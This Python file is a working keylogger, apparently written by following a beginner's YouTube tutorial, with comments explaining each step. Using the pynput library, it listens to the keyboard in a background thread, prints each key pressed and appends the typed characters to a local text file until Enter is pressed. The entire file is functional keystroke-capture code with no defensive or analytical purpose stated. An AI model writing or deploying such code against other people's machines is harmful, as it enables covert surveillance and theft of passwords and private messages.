

"""
Credit
followed the following tutorial:
    name: How To Code A Keylogger In Python | Programming Tutorial For Beginners
    channel: Shaun Halverson
    url: https://www.youtube.com/watch?v=mDY3v2Xx-Q4
"""

from pynput import keyboard

def keyPressed(key):

    #prints key pressed to console
    print(str(key))

    #opens or creates text file, a stands for append mode
    with open("keyfile.txt", 'a') as logKey:

        try:
            #gets key as char and writes it to file
            char = key.char
            logKey.write(char)


        except:
            #if cant get a char then catch error so keylogger continues to run
            print("Error getting char")

#checks if file is being run directly
if __name__ == "__main__":

    #creates a listener object with the following parameter
    #listener watches keyboard in backround and calls keyPressed each time a key is clicked
    listener = keyboard.Listener( on_press = keyPressed)

    #starts listener in a different thread to allow main to continue running
    listener.start()

    #waiting for input, will close listener when enter is clicked in console
    input()



